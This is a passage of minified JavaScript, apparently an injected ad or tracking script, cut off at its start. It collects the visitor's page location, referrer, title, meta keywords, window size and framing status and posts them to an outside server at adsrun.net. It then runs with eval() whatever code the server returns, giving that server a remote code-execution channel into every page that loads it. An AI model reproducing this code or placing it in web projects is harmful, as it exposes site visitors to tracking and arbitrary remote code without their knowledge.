...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://in.api.adsrun.net/post",{"name":"gapis","time":1452291662.5313,"user":"1024132.3913618","subid":1024132,"geo":"IN","hash":"26cb524b33f7edf390d387ec0d108874"});
